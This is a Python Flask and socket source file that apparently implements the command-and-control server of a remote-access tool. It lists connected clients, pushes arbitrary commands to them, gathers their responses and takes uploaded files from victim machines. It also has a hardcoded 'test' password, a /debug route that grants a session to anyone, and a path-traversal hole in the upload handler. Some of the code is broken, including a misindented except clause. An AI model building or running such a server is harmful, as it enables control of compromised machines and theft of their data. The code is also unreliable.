from flask import Flask, request, jsonify, session
import socket
import threading
import os
from random import choice

class Server:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 8888
        self.app = Flask(__name__)
        self.app.secret_key = "".join(choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789") for _ in range(35))
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        self.clients = []
        self.responses = {}
        panel_password = "test"
        @self.app.route("/validate-password", methods=["POST"])
        def login():
            data = request.get_json()
            password = data["password"]
            if password == panel_password:
                session["password"] = password
                return jsonify({"valid": True, "msg": "Valid password"})
            return jsonify({"valid": False, "msg": "Invalid password"}), 401

        @self.app.route("/send-command", methods=["POST"])
        def send_command():
            if "password" not in session or session["password"] != panel_password:
                return jsonify({"valid": False, "msg": "Unauthorized"}), 401

            data = request.get_json()
            command = data.get("command", "")
            selected_clients = data.get("selected_clients", [])
            if selected_clients != "all":
                for index in selected_clients:
                    try:
                        client_index = int(index)
                        if 0 <= client_index < len(self.clients):
                            client = self.clients[client_index]
                            client.send(command.encode())
                            print(f"Sent command `{command}` to Client {client_index}")
                except (ValueError, IndexError):
                    pass
            else:
                for client_index in range(len(self.clients)):
                            client = self.clients[client_index]
                            client.send(command.encode())
                            print(f"Sent command `{command}` to Client {client_index}")
                
            return jsonify({"valid": True})

        @self.app.route("/list-clients", methods=["GET"])
        def list_clients():
            if "password" not in session or session["password"] != panel_password:
                return jsonify({"valid": False, "msg": "Unauthorized"}), 401

            clients1 = [client.getpeername()[0] for client in self.clients]
            return jsonify(clients1)
        @self.app.route("/debug", methods=["GET"])
        def debug():
            session["password"] = panel_password
            return jsonify({"worked":session["password"] == panel_password})
        @self.app.route('/uploadClientData', methods=['POST'])
        def upload_file():
            uploaded_file = request.files['file']

            if uploaded_file:
                ip = request.get_json().get("ip")
                file_path = os.path.join("/client", ip, uploaded_file.filename)
                uploaded_file.save(file_path)
                return jsonify({"valid": True, "msg": "Successfully uploaded"}), 200
            else:
                return jsonify({"valid": False, "msg": "File not found"}), 404

        @self.app.route("/get-response", methods=["GET"])
        def get_response():
            if "password" not in session or session["password"] != panel_password:
                return jsonify({"valid": False, "msg": "Unauthorized"}), 401

            rsps = {}
            for i in self.responses.items():
                print(i[0])
                rsps[self.clients[i[0]].getpeername()[0]] = i[1].encode("utf-8").decode("unicode-escape")
            return jsonify(rsps)

    def start(self):
        threading.Thread(target=self.app.run).start()
        threading.Thread(target=self.main).start()

    def main(self):
        print(f"Server listening on {self.host}:{self.port}")
        while True:
            client_socket, addr = self.server_socket.accept()
            self.clients.append(client_socket)
            client_handler = threading.Thread(target=self.handle_client, args=(client_socket,))
            client_handler.start()

    def handle_client(self, client_socket):
        try:
            print("New client connected!")
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                print(f"Received command: {data.decode()}")
                self.responses[self.clients.index(client_socket)] = data.decode()
                print("Command received")
        except Exception as e:
            print(f"Client disconnected: {str(e)}")
        finally:
            try:
                del self.responses[self.clients.index(client_socket)]
            except:
                pass
            if client_socket in self.clients:
                self.clients.remove(client_socket)
            client_socket.close()

server = Server()
server.start()